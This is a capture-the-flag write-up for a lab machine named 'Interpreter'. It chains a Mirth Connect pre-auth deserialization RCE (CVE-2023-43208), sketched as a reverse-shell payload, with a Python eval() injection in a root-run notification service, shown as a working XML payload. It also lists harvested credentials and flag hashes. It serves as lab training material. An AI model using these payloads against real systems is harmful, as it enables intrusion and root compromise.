# Interpreter — Report

**IP:** 10.129.244.184  
**OS:** Linux (Ubuntu)  
**Difficulty:** Medium  

## Flags

| Flag | Hash |
|------|------|
| User | `ed27acddbdf73ba402b5de1b3ffa9965` |
| Root | `7ef999c44bdab72d126ab3252e77eebf` |

## Attack Chain

### 1. Foothold: CVE-2023-43208 — Mirth Connect Pre-Auth RCE

**Target:** Mirth Connect 4.4.0 on port 443  
**Vulnerability:** XStream Java deserialization via POST `/api/users`  
**Impact:** Shell as `mirth` (uid=103, service account)

Mirth Connect 4.4.0 is vulnerable to CVE-2023-43208, a pre-authentication RCE through XStream deserialization. The exploit sends a crafted XML payload to the `/api/users` API endpoint that chains Apache Commons Collections transformers to execute arbitrary commands via `Runtime.exec()`.

```
POST /api/users HTTP/1.1
Content-Type: application/xml
X-Requested-With: XMLHttpRequest

<sorted-set><string>abcd</string><dynamic-proxy>...
  ChainedTransformer → ConstantTransformer(Runtime.class)
  → InvokerTransformer(getMethod, "getRuntime")
  → InvokerTransformer(invoke)
  → InvokerTransformer(exec, "bash reverse shell")
</dynamic-proxy></sorted-set>
```

### 2. Enumeration as mirth

- MySQL creds from `/opt/mirthconnect/conf/mirth.properties`: `mirthdb:MirthPass123!`
- Database `mc_bdd_prod` contains Mirth config including user hashes
- `sedric` (uid=1000) is the only real user; home directory locked
- Port 54321: internal Python service (`notif.py`) running as **root** via systemd
- Port 6661: Mirth HL7/MLLP listener that forwards to notif.py
- No sudo, no useful SUID, no cron — notif.py is the privesc path

### 3. Privesc: Python eval() Injection in notif.py → ROOT

**Target:** `notif.py` on localhost:54321  
**Vulnerability:** f-string template injection via `eval()`  
**Impact:** Arbitrary code execution as root

The notification service receives XML patient data and formats it into a notification string. The critical code:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
return eval(f"f'''{template}'''")
```

User input (firstname, lastname, etc.) is interpolated into an f-string template that is then passed to `eval()`. While a regex filter restricts characters to `^[a-zA-Z0-9._'"(){}=+/]+$`, this allows curly braces `{}` and parentheses `()` — sufficient for Python expression injection.

**Discovery process:**
1. Sent `{0}` in firstname → returned `0` (format expression evaluated)
2. Sent `{__class__}` → got `[EVAL_ERROR] name '__class__' is not defined` (eval confirmed)
3. Sent `{7+7}` → returned `14` (arithmetic eval confirmed)

**Exploit payload:**
```xml
<patient>
  <firstname>{__import__('os').popen('id').read()}</firstname>
  <lastname>Doe</lastname>
  <birth_date>15/01/1990</birth_date>
  <gender>M</gender>
  ...
</patient>
```

Response: `Patient uid=0(root) gid=0(root) groups=0(root) Doe (M), 36 years old...`

No spaces needed in the Python expression, so the regex filter is bypassed entirely.

## Dead Ends

1. **Mirth password hash cracking** — PBKDF2 hash for sedric with unknown iteration count; tried 1000/10000/100000 with common passwords, all failed
2. **Credential reuse** — MirthPass123!, keystore passwords, common passwords all failed for SSH/su as sedric
3. **SSTI (Jinja2)** — Initially assumed Jinja2 templates; testing revealed it's not Jinja2 but Python eval
4. **Earlier character filter confusion** — Initial tests incorrectly concluded parentheses were blocked; re-testing showed they're allowed

## Credentials

| Service | Username | Password |
|---------|----------|----------|
| MySQL | mirthdb | MirthPass123! |
| Mirth Keystore | storepass | 5GbU5HGTOOgE |
| Mirth Keystore | keypass | tAuJfQeXdnPw |

## Lessons Learned

1. **"Interpreter" was the hint** — The box name pointed directly at Python's `eval()` / interpreter functionality. The service literally interprets Python expressions.
2. **Format string → eval() detection** — The key breakthrough was sending `{__class__}` and getting `[EVAL_ERROR]` back, which proved the service uses `eval()` on format string contents rather than simple string interpolation.
3. **Regex filters are not security boundaries** — Allowing `{}()'"` in a regex while using `eval()` is fundamentally insecure regardless of what other characters are blocked.
